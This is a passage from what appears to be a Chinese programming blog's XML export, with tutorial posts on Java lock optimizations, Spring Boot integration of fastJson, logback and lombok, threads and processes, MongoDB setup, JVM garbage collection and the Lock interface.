锁粗化我们知道在使用同步锁的时候，需要让同步块的作用范围尽可能小—仅在共享数据的实际作用域中才进行同步，这样做的目的是为了使需要同步的操作数量尽可能缩小，如果存在锁竞争，那么等待锁的线程也能尽快拿到锁。 在大多数的情况下，上述观点是正确的，LZ也一直坚持着这个观点。但是如果一系列的连续加锁解锁操作，可能会导致不必要的性能损耗，所以引入锁粗话的概念。 锁粗话概念比较好理解，就是将多个连续的加锁、解锁操作连接在一起，扩展成一个范围更大的锁。如上面实例：vector每次add的时候都需要加锁操作，JVM检测到对同一个对象（vector）连续加锁、解锁操作，会合并一个更大范围的加锁、解锁操作，即加锁解锁操作会移到for循环之外。 轻量级锁引入轻量级锁的主要目的是在多没有多线程竞争的前提下，减少传统的重量级锁使用操作系统互斥量产生的性能消耗。当关闭偏向锁功能或者多个线程竞争偏向锁导致偏向锁升级为轻量级锁，则会尝试获取轻量级锁。 轻量级锁所适应的场景是线程交替执行同步块的情况，如果存在同一时间访问同一锁的情况，就会导致轻量级锁膨胀为重量级锁。 偏向锁引入偏向锁主要目的是：为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径。上面提到了轻量级锁的加锁解锁操作是需要依赖多次CAS原子指令的。 引入偏向锁是为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径，因为轻量级锁的获取及释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销操作的性能损耗必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块时提高性能，而偏向锁则是在只有一个线程执行同步块时进一步提高性能。 本文重点介绍了JDk中采用轻量级锁和偏向锁等对Synchronized的优化，但是这两种锁也不是完全没缺点的，比如竞争比较激烈的时候，不但无法提升效率，反而会降低效率，因为多了一个锁升级的过程，这个时候就需要通过-XX:-UseBiasedLocking来禁用偏向锁。下面是这几种锁的对比： 锁 优点 缺点 试用场景 偏向锁 加锁和解锁不需要额外的消耗，和执行非同步方法比仅存在纳秒级的差距。 如果线程间存在锁竞争，会带来额外的锁撤销的消耗。 适用于只有一个线程访问同步块场景。 轻量级锁 竞争的线程不会阻塞，提高了程序的响应速度。 如果始终得不到锁竞争的线程使用自旋会消耗CPU。 追求响应时间。同步块执行速度非常快。 重量级锁 线程竞争不使用自旋，不会消耗CPU。 线程阻塞，响应时间缓慢。 追求吞吐量。同步块执行速度较长。]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二、整合fastJson、整合logback、lombok插件、单元测试]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%8C%E3%80%81%E6%95%B4%E5%90%88fastJson%E3%80%81%E6%95%B4%E5%90%88logback%E3%80%81lombok%E6%8F%92%E4%BB%B6%E3%80%81%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[整合fastJson、整合logback、lombok插件、单元测试 1、如何对controller进行测试？示例： 1234567891011121314151617@RunWith(SpringRunner.class)@SpringBootTest(classes = Bike01Application.class,webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)public class UserControllerTest &#123; @Autowired private TestRestTemplate restTemplate; @LocalServerPort private int port; @Autowired private UserService userService; @Test public void testShow()&#123; String result = restTemplate.getForObject("/user/test",String.class); System.out.println(result); &#125;&#125; 2、spring默认使用的json是jackson，效率比较低；jackson与fastjson的区别：当查询某条记录，这条记录某个字段为NULL时，jackson也会转化为NULL： 比如我数据库中的headImg字段为null，这里获取到的对象中仍然转化为NULL: 1&#123;"id":1,"nickname":"wang","mobile":"18980840843","headImg":null,"verifyFlag":2,"enableFlag":1&#125; 但是fastJSon对此进行了优化，它认为为null的字段就不需要转化了，那么我们就要首先覆盖原来的jackson,再来测试结果。覆盖方式为类似于xml中的配置bean，他用java来配置一个messageConvertor的bean: 123456@Beanpublic HttpMessageConverters fastJsonHttpMessageConverters() &#123; FastJsonHttpMessageConverter fastConverter = new FastJsonHttpMessageConverter(); HttpMessageConverter&lt;?&gt; converter = fastConverter; return new HttpMessageConverters(converter);&#125; 我们再来查询这条记录，发现为空的直接就不转化了： 1&#123;"verifyFlag":2,"mobile":"18980840843","nickname":"wang","id":1,"enableFlag":1&#125; 3、整合日志logback引入依赖： 1234567891011121314151617181920&lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-access&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt;&lt;/dependency&gt; logback.xml: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration&gt; &lt;property name="LOG_HOME" value="/logs/bikeLog/" /&gt; &lt;appender name="Console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;H:mm&#125; %-5level [%logger&#123;16&#125;] %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name="normalLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;FileNamePattern&gt;$&#123;LOG_HOME&#125;/web.normal.%d&#123;yyyy-MM-dd&#125;.log &lt;/FileNamePattern&gt; &lt;MaxHistory&gt;30&lt;/MaxHistory&gt; &lt;/rollingPolicy&gt; &lt;triggeringPolicy class="ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"&gt; &lt;maxFileSize&gt;10MB&lt;/maxFileSize&gt; &lt;/triggeringPolicy&gt; &lt;layout class="ch.qos.logback.classic.PatternLayout"&gt; &lt;pattern&gt;%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;16&#125; - %msg%n &lt;/pattern&gt; &lt;/layout&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;DENY&lt;/onMatch&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;appender name="errorLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;FileNamePattern&gt;$&#123;LOG_HOME&#125;/web.error.%d&#123;yyyy-MM-dd&#125;.log &lt;/FileNamePattern&gt; &lt;MaxHistory&gt;30&lt;/MaxHistory&gt; &lt;/rollingPolicy&gt; &lt;triggeringPolicy class="ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"&gt; &lt;maxFileSize&gt;10MB&lt;/maxFileSize&gt; &lt;/triggeringPolicy&gt; &lt;layout class="ch.qos.logback.classic.PatternLayout"&gt; &lt;pattern&gt;%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;16&#125; - %msg%n &lt;/pattern&gt; &lt;/layout&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;logger name="com.oursnail" level="debug" &gt; &lt;appender-ref ref="normalLog" /&gt; &lt;appender-ref ref="errorLog" /&gt; &lt;/logger&gt; &lt;root level="info"&gt; &lt;appender-ref ref="Console" /&gt; &lt;/root&gt;&lt;/configuration&gt; application.yml中调用这个xml: 123#loglogging: config: classpath:logback.xml maven中为了让这些xml被编译： 123456789&lt;resource&gt; &lt;directory&gt;$&#123;basedir&#125;/src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;*.yml&lt;/include&gt; &lt;include&gt;*.properties&lt;/include&gt; &lt;include&gt;*.xml&lt;/include&gt; &lt;include&gt;enc_pri&lt;/include&gt; &lt;/includes&gt;&lt;/resource&gt; 进行测试： 在userServiceImpl中故意写一个会抛异常的方法：重复插入id和not null却不插值： 1234567@Overridepublic String login() &#123; User user = new User(); user.setId(1L); userMapper.insertSelective(user); return null;&#125; 在单元测试中： 注意引入Logger,选择slf4j 123456789Logger logger = LoggerFactory.getLogger(UserControllerTest.class);@Testpublic void testLogin()&#123; try&#123; userService.login(); &#125;catch (Exception e)&#123; logger.error("用户插入出错了",e); &#125;&#125; 运行之后，控制台提示“用户插入出错”，并且发现日志中也记录下来了。整合成功！！ 4、lombok实体类中有很多get set 方法以及要重复使用logger，为了方便，可以直接使用lombok这个插件 引入依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.16.6&lt;/version&gt;&lt;/dependency&gt; 干掉实体类中的get set方法，直接在类头上写注解： 1@Data 针对需要使用logback的地方，在类头写： 1@Slf4j 然后就可以直接调用：log.error(&quot;用户插入出错了&quot;,e); 此时运行时是没有问题的，但是编译器还不能识别这个，需要装上lombok插件，重启一下，正常！]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二、基础概念]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[了解一下经典的问题：线程与进程的概念。 1. 并发和并行经典的例子介绍： 并发和多线程之间联系和区别 并发是两个队列交替使用一台咖啡机； 并行是两个队列同时使用两台咖啡机； 串行就是一个队列使用一台咖啡机，后面只能等前面取完咖啡才能使用，无疑效率最低。 总结：并发和并行都可以是很多个线程，就看这些线程能不能同时被多个cpu执行。如果可以就说明是并行，而并发是多个线程被一个cpu轮流切换着执行。 2. 进程和线程一个程序至少有一个进程,一个进程至少有一个线程. 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。 定义方面：进程是程序在某个数据集合上的一次运行活动；线程是进程中的一个执行路径。 角色方面：在支持线程机制的系统中，进程是系统资源分配的单位，线程是系统调度的单位。 资源共享方面：进程之间不能共享资源，而线程共享所在进程的地址空间和其它资源。同时线程还有自己的栈和栈指针，程序计数器等寄存器。对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。 独立性方面：进程有自己独立的地址空间，而线程没有，线程必须依赖于进程而存在。 简单总结就是： 进程是程序在计算机上的一次执行活动，进程是资源分配的基本单位。 线程是进程的一个实体，线程是处理器调度的基本单位。 进程中包含多个线程，线程共享进程的资源。 看到一个奇怪的问题，以前从来没想到过：线程崩溃一定会造成进程崩溃？ 线程崩溃了，程序基本上就会崩。线程崩溃的本质就是内存出错。而内存出错有时不会引起其他线程出错的，因为崩溃的线程，也就是出错的内存有时侯没有被其他线程访问，也就不会产生问题，但有时候会打乱其他线程的内存。 线程有自己的 stack，但是没有单独的 heap，也没有单独的 address space。只有进程有自己的 address space，而这个 space 中经过合法申请的部分叫做 process space。Process space 之外的地址都是非法地址。当一个线程向非法地址读取或者写入，无法确认这个操作是否会影响同一进程中的其它线程，所以只能是整个进程一起崩溃。 3. 并发和多线程之间联系和区别并发与多线程之间的关系就是目的与手段之间的关系。 并发（Concurrent）的反面是串行。串行好比多个车辆行驶在一股车道上，它们只能“鱼贯而行”。而并发好比多个车辆行驶在多股车道上，它们可以“并驾齐驱”。并发的极致就是并行（Parallel）。 多线程就是将原本可能是串行的计算“改为”并发（并行）的一种手段、途径或者模型。因此，有时我们也称多线程编程为并发编程。 当然，目的与手段之间常常是一对多的关系。并发编程还有其他的实现途径，例如函数式（Functional programming）编程。多线程编程往往是其他并发编程模型的基础，所以多线程编程的重要性不言而喻。]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[九、MongoDB入门上]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B9%9D%E3%80%81MongoDB%E5%85%A5%E9%97%A8%E4%B8%8A%2F</url>
    <content type="text"><![CDATA[先简单看看mongoDB怎么用。 1、因为用到mongodb，所以先安装一下，然后入一下门2、下载到官网 https://www.mongodb.com/download-center#community 点击 All Version Binaries 进入选择最近的zip下载 https://www.mongodb.org/dl/win32/x86_64-2008plus-ssl?_ga=2.26151293.1146073882.1509520277-1740852681.1509520277 3、简单的安装启动1mongod --dbpath D:\mongodb\data\db 数据就放在D:\mongodb\data\db下，要先创建好这个文件夹。 安装成功之后会提示端口port=27017 ，输入http://localhost:27017/，看到：It looks like you are trying to access MongoDB over HTTP on the native driver port.这句话就说明已经启动成功了。 4、每次都要去启动会比较繁琐，做成服务在data目录下新建文件夹：log,新建文件mongo.log在mongodb这个目录下新建文件:mongo.config 123dbpath=D:\mongodb\data\dblogpath=D:\mongodb\data\log\mongo.log 然后进入bin执行命令： 1mongod --config D:\mongodb\mongo.config --install --serviceName &quot;MongoDB&quot; 进入服务管理，这时应该可以看到mongodb的服务，直接启动即可。 5、黑窗口的操作执行mongo命令，进入shell，可以直接操作数据库。 塞入数据：这里是新建了一个person的集合，相当于Mysql中的table 123db.person.insert(&#123;&apos;name&apos;:&apos;swg&apos;,&apos;age&apos;:12&#125;)db.person.insert(&#123;&apos;name&apos;:&apos;xf&apos;,&apos;age&apos;:22&#125;)db.person.insert(&#123;&apos;name&apos;:&apos;hh&apos;,&apos;age&apos;:32&#125;) 查询所有数据： 1db.person.find() 查询某一条具体数据： 1db.person.find(&#123;&apos;name&apos;:&apos;swg&apos;&#125;) 更新某一条数据 1db.person.update(&#123;&apos;name&apos;:&apos;swg&apos;,&apos;age&apos;:12&#125;,&#123;&apos;name&apos;:&apos;swg111&apos;,&apos;age&apos;:13&#125;) 删除某一条数据 1db.person.remove(&#123;&apos;name&apos;:&apos;hhhhhh&apos;&#125;) 6、图形化界面：robomongo下载: http://www.newasp.net/soft/75669.html#downloaded 优势：查看数据比较直观 稍微详细点的介绍： https://github.com/StevenSLXie/Tutorials-for-Web-Developers/blob/master/MongoDB%20%E6%9E%81%E7%AE%80%E5%AE%9E%E8%B7%B5%E5%85%A5%E9%97%A8.md 易百的教程： http://www.yiibai.com/mongodb/]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二、垃圾回收]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%8C%E3%80%81%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%2F</url>
    <content type="text"><![CDATA[虚拟机本身为我们处理了很多事情，其中最主要的一件事就是进行垃圾的自动回收，我们先来看看垃圾回收的基本原理。 1、如何判断对象是否存活？1.1 引用计数法算法思想 给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值加一；当引用失效时，计数器☞减一；任何时候计数器为0的对象是不可能再被使用的。 主要缺陷 无法解决对象间相互循环引用的问题。 举个例子 12345678910111213141516171819202122232425public class Test &#123; public Object instance = null; private static final int _1MB = 1024 * 1024; private byte[] bigSize = new byte[2 * _1MB]; public static void testGC() &#123; Test objA = new Test();//count=1 Test objB = new Test();//count=1 objA.instance = objB;//count=2 objB.instance = objA;//count=2 objA = null;//count=1 objB = null;//count=1 System.gc(); &#125; public static void main(String[] args) &#123; testGC(); &#125;&#125; 输入参数 -verbose:gc -XX:+PrintGCDetails 结果 1234567891011[GC (System.gc()) [PSYoungGen: 6063K-&gt;600K(37888K)] 6063K-&gt;608K(123904K), 0.0037131 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] [Full GC (System.gc()) [PSYoungGen: 600K-&gt;0K(37888K)] [ParOldGen: 8K-&gt;529K(86016K)] 608K-&gt;529K(123904K), [Metaspace: 2595K-&gt;2595K(1056768K)], 0.0062705 secs] [Times: user=0.03 sys=0.00, real=0.01 secs] Heap PSYoungGen total 37888K, used 328K [0x00000000d6100000, 0x00000000d8b00000, 0x0000000100000000) eden space 32768K, 1% used [0x00000000d6100000,0x00000000d6152030,0x00000000d8100000) from space 5120K, 0% used [0x00000000d8100000,0x00000000d8100000,0x00000000d8600000) to space 5120K, 0% used [0x00000000d8600000,0x00000000d8600000,0x00000000d8b00000) ParOldGen total 86016K, used 529K [0x0000000082200000, 0x0000000087600000, 0x00000000d6100000) object space 86016K, 0% used [0x0000000082200000,0x0000000082284778,0x0000000087600000) Metaspace used 2601K, capacity 4486K, committed 4864K, reserved 1056768K class space used 288K, capacity 386K, committed 512K, reserved 1048576K 分析 日志中6063K-&gt;600K(37888K)，从原来的6M内存变成了600k，表明对象已被回收，从而表明JVM没有使用引用计数算法。Java中使用了可达性分析算法来来判定对象是否存活。 1.2 可达性分析算法这个算法的基本思路就是通过一系列的称谓“GC Roots”的对象作为起始点，从这些节点开始向下搜索，搜索所有走过的路径为引用链，当一个对象到GC Roots没有任何引用链项链时，则证明此对象时不可用的，下面看一下例子： 上面的这张图，对象object5、object6、object7虽然互相没有关联，但是它们到GC Roots是不可达的，所以它们将会被判定为是可回收的对象 注：Java语言中，可作为GC Roots的对象包括下面几种：1) 虚拟机栈(栈帧中的本地变量表)中引用的对象2) 方法区中类静态属性引用的对象3) 方法区中常量引用的对象4) 本地方法栈中JNI(即一般说的Native方法)引用的对象 2、Java中的引用类型从JDK1.2之后，Java对引用的概念进行了扩充，将引用分为强引用，软引用，弱引用，虚引用，这四种引用的强度一次逐渐减弱 1) 强引用就是指在程序代码之中普遍存在的，类似 “Object obj = new Object()” 这类的引用，只要强引用还存在，垃圾回收器永远不会回收掉被引用的对象。 2) 软引用是用来描述一些还有用但并非需要的对象，对于软引用关联着的对象，在系统将要发生内存异常之前，将会把这些对象列进回收范围之中进行第二次回收，如果这次回收还没有足够的内存，才会抛出内存异常 3) 弱引用也是用来描述非必需对象的，但是它的强度比软引用更弱一些，被弱引用关联的对象只能生存岛下一次垃圾收集发生之前，当垃圾收集器工作时，无论当前内存释放足够，都会回收掉只被弱引用关联的对象 4) 虚引用也称为幽灵引用或者幻影引用，它是最弱的一种引用关系，一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例，对一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知 3、两次标记《深入理解java虚拟机》原文： 在java根搜索算法中判断对象的可达性，对于不可达的对象，也并不一定是必须清理。这个时候有一个缓刑期，真正的判断一个对象死亡，至少要经过俩次标记过程： 如果对象在进行根搜索后发现没有与GC roots相关联的引用链，那他将会第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行finalize（）方法，当对象没有覆盖finalize（）方法，或者finalize（）方法已经被虚拟机调用过，虚拟机将这俩种情况都视为“没有必要执行”。 即当一个对象重写了finalize（）方法的时候，这个对象被判定为有必要执行finalize（）方法，那么这个对象被放置在F-Queue队列之中，并在稍后由一条由虚拟机自动建立的、低优先级的Finalizer线程去执行。这里所谓的执行是指虚拟机会出发这个方法，但不承诺会等待它运行结束。这样做的原因：如果一个对象在finalize()方法中执行缓慢，或者发生了死循环（极端的情况下），将可能会导致F-Queue队列中的其他对象永久处于等待状态，甚至导致整个内存回收系统崩溃。finalize（）方法是对象逃脱死亡命运的最后一次机会，稍后GC将对F-Queue中的对象进行第二次小规模的标记，如果对象要在finalize（）中成功拯救自己—-只要重新与引用链上的任何建立关联即可，那么在第二次标记时它将会被移出“即将回收”的集合；如果对象这时候没有逃脱，就会被回收。 说明： finalize的工作原理一旦垃圾收集器准备好释放对象占用的存储空间，它首先调用finalize()，而且只有在下一次垃圾收集过程中，才会真正回收对象的内存.所以如果使用finalize()，就可以在垃圾收集期间进行一些重要的清除或清扫工作. finalize()在什么时候被调用? 所有对象被Garbage Collection时自动调用,比如运行System.gc()的时候. 程序退出时为每个对象调用一次finalize方法。 显式的调用finalize方法 这个方法的用途就是：在该对象被回收之前，该对象的finalize()方法会被调用。这里的回收之前指的就是被标记之后，问题就出在这里，有没有一种情况就是原本一个对象开始不再上一章所讲的“关系网”（引用链）中，但是当开发者重写了finalize()后，并且将该对象重新加入到了“关系网”中，也就是说该对象对我们还有用，不应该被回收，但是已经被标记啦，怎么办呢？ 针对这个问题，虚拟机的做法是进行两次标记，即第一次标记不在“关系网”中的对象，并且要判断该对象有没有实现finalize()方法了，如果没有实现就直接判断该对象可回收。如果实现了就会先放在一个队列中，并由虚拟机建立的一个低优先级的线程去执行它。 随后就会进行第二次的小规模标记，如果对象还没有逃脱，在这次被标记的对象就会真正的被回收了。 4、垃圾收集算法1) 标记-清除算法最基础的收集算法是“标记-清除”（Mark-Sweep）算法，如它的名字一样，算法分为“标记”和“清除”两个阶段：首先标记出所有需要回收的对象，在标记完成后统一回收掉所有被标记的对象，它的标记过程其实在前一节讲述对象标记判定时已经基本介绍过了。之所以说它是最基础的收集算法，是因为后续的收集算法都是基于这种思路并对其缺点进行改进而得到的。它的主要缺点有两个：一个是效率问题，标记和清除过程的效率都不高；另外一个是空间问题，标记清除之后会产生大量不连续的内存碎片，空间碎片太多可能会导致，当程序在以后的运行过程中需要分配较大对象时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。 标记-清除算法的执行过程如图 2) 复制算法为了解决效率问题，一种称为“复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。这样使得每次都是对其中的一块进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。只是这种算法的代价是将内存缩小为原来的一半，未免太高了一点。复制算法的执行过程如图 3) 标记-整理算法复制收集算法在对象存活率较高时就要执行较多的复制操作，效率将会变低。更关键的是，如果不想浪费50%的空间，就需要有额外的空间进行分配担保，以应对被使用的内存中所有对象都100%存活的极端情况，所以在老年代一般不能直接选用这种算法。 根据老年代的特点，有人提出了另外一种“标记-整理”（Mark-Compact）算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存，“标记-整理”算法的示意图如图 4) 分代收集算法当前商业虚拟机的垃圾收集都采用“分代收集”（Generational Collection）算法，这种算法并没有什么新的思想，只是根据对象的存活周期的不同将内存划分为几块。一般是把Java堆分为新生代和老年代，这样就可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量存活对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用“标记-清理”或“标记-整理”算法来进行回收 jvm区域总体分两类，heap区和非heap区。heap区又分：Eden Space（伊甸园）、Survivor Space(幸存者区)、Tenured Gen（老年代-养老区）。 非heap区又分：Code Cache(代码缓存区)、Perm Gen（永久代）、Jvm Stack(java虚拟机栈)、Local Method Statck(本地方法栈)。 Young：主要是用来存放新生的对象。 Old：主要存放应用程序中生命周期长的内存对象。 Permanent：是指内存的永久保存区域，主要存放Class和Meta的信息,Class在被 Load的时候被放入PermGen space区域. 它和和存放Instance的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的APP会LOAD很多CLASS的话,就很可能出现PermGen space错误。 1、【新生代】 新生代分为三个区域，一个Eden区和两个Survivor区，它们之间的比例为（8：1：1），这个比例也是可以修改的。通常情况下，对象主要分配在新生代的Eden区上，少数情况下也可能会直接分配在老年代中。Java虚拟机每次使用新生代中的Eden和其中一块Survivor（From），在经过一次MinorGC后，将Eden和Survivor中还存活的对象一次性地复制到另一块Survivor空间上（这里使用的复制算法进行GC），最后清理掉Eden和刚才用过的Survivor（From）空间。将此时在Survivor空间存活下来的对象的年龄设置为1，以后这些对象每在Survivor区熬过一次GC，它们的年龄就加1，当对象年龄达到某个年龄（默认值为15）时，就会把它们移到老年代中。 在新生代中进行GC时，有可能遇到另外一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象，这些对象将直接通过分配担保机制进入老年代。 总结： 1、Minor GC是发生在新生代中的垃圾收集，采用的复制算法； 2、新生代中每次使用的空间不超过90%，主要用来存放新生的对象； 3、Minor GC每次收集后Eden区和一块Survivor区都被清空； 2、【老年代】 老年代里面存放都是生命周期长的对象，对于一些较大的对象（即需要分配一块较大的连续内存空间），是直接存入老年代的，还有很多从新生代的Survivor区域中熬过来的对象。 老年代中使用的是Full GC，Full GC所采用的是标记-清除或者标记-整理算法。老年代中的Full GC不像Minor GC操作那么频繁，并且进行一次Full GC所需要的时间要比Minor GC的时间长。 总结： 1、老年代中使用Full GC，采用的标记-清除或者标记-整理算法 当生成一个新对象时，内存申请过程如下： A. JVM会试图为相关Java对象在Eden中初始化一块内存区域 B. 当Eden空间足够时，内存申请结束。否则到下一步 C. JVM试图释放在Eden中所有不活跃的对象（这属于1或更高级的垃圾回收）, 释放后若Eden空间仍然不足以放入新对象，则试图将部分Eden中活跃对象放入Survivor区 D. Survivor区被用来作为Eden及Old的中间交换区域，当Old区空间足够时，Survivor区的对象会被移到Old区，否则会被保留在Survivor区 E. 当Old区空间不够时，JVM会在Old区进行完全的垃圾收集（0级） F. 完全垃圾收集后，若Survivor及Old区仍然无法存放从Eden复制过来的部分对象，导致JVM无法在Eden区为新对象创建内存区域，则出现”out of memory错误”]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[九、Lock接口简单体验]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B9%9D%E3%80%81Lock%E6%8E%A5%E5%8F%A3%E7%AE%80%E5%8D%95%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[并发基础篇最后聊一聊Lock接口。 1. 为什么要用lock如果一个代码块被synchronized修饰了，当一个线程获取了对应的锁，并执行该代码块时，其他线程便只能一直等待，等待获取锁的线程释放锁，而这里获取锁的线程释放锁只会有两种情况： 1）获取锁的线程执行完了该代码块，然后线程释放对锁的占有； 2）线程执行发生异常，此时JVM会让线程自动释放锁。 那么如果这个获取锁的线程由于要等待IO或者其他原因（比如调用sleep方法）被阻塞了，但是又没有释放锁，其他线程便只能干巴巴地等待，试想一下，这多么影响程序执行效率。 因此就需要有一种机制可以不让等待的线程一直无期限地等待下去（比如只等待一定的时间或者能够响应中断），通过Lock就可以办到。 1）Lock不是Java语言内置的，synchronized是Java语言的关键字，因此是内置特性。Lock是一个类，通过这个类可以实现同步访问； 2）Lock和synchronized有一点非常大的不同，采用synchronized不需要用户去手动释放锁，当synchronized方法或者synchronized代码块执行完之后，系统会自动让线程释放对锁的占用；而Lock则必须要用户去手动释放锁，在发生异常时，不会自动释放锁，如果没有主动释放锁，就有可能导致出现死锁现象。 2. Lock的优势 使用Lock可以方便地实现公平性 非阻塞地获取锁 能被中断地获取锁 超时获取锁 3. Lock的几个方法 lock()：是平常使用得最多的一个方法，就是用来获取锁。如果锁已被其他线程获取，则进行等待。 unLock()：最好在finally中释放锁 123456789Lock lock = ...;lock.lock();try&#123; //处理任务&#125;catch(Exception ex)&#123; &#125;finally&#123; lock.unlock(); //释放锁&#125; tryLock()：是有返回值的，它表示用来尝试获取锁，如果获取成功，则返回true，如果获取失败（即锁已被其他线程获取），则返回false，也就说这个方法无论如何都会立即返回。在拿不到锁时不会一直在那等待。 tryLock(long time, TimeUnit unit)：和tryLock()方法是类似的，只不过区别在于这个方法在拿不到锁时会等待一定的时间，在时间期限之内如果还拿不到锁，就返回false。如果如果一开始拿到锁或者在等待期间内拿到了锁，则返回true。 123456789101112Lock lock = ...;if(lock.tryLock()) &#123; try&#123; //处理任务 &#125;catch(Exception ex)&#123; &#125;finally&#123; lock.unlock(); //释放锁 &#125; &#125;else &#123; //如果不能获取锁，则直接做其他事情&#125; lockInterruptibly()：当通过这个方法去获取锁时，如果线程正在等待获取锁，则这个线程能够响应中断，即中断线程的等待状态。也就是说，当两个线程同时通过lock.lockInterruptibly()想获取某个锁时，假若此时线程A获取到了锁，而线程B只有在等待，那么对线程B调用threadB.interrupt()方法能够中断线程B的等待过程。 123456789public void method() throws InterruptedException &#123; lock.lockInterruptibly(); try &#123; //..... &#125; finally &#123; lock.unlock(); &#125; &#125; 因此当通过lockInterruptibly()方法获取某个锁时，如果不能获取到，只有进行等待的情况下，是可以响应中断的。 而用synchronized修饰的话，当一个线程处于等待某个锁的状态，是无法被中断的，只有一直等待下去。 3. 自己实现一把锁12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 自己实现一个锁，但是01版本还不是可重入锁 * @author swg * */public class MyLock01 implements Lock&#123; private boolean isLocked = false; @Override public synchronized void lock() &#123; //不是第一把锁，就一直wait while(isLocked)&#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; //第一个拿到锁的线程 isLocked = true; &#125; @Override public synchronized void unlock() &#123; isLocked = false; notify(); &#125; @Override public void lockInterruptibly() throws InterruptedException &#123; &#125; @Override public boolean tryLock() &#123; return false; &#125; @Override public boolean tryLock(long time, TimeUnit unit) throws InterruptedException &#123; return 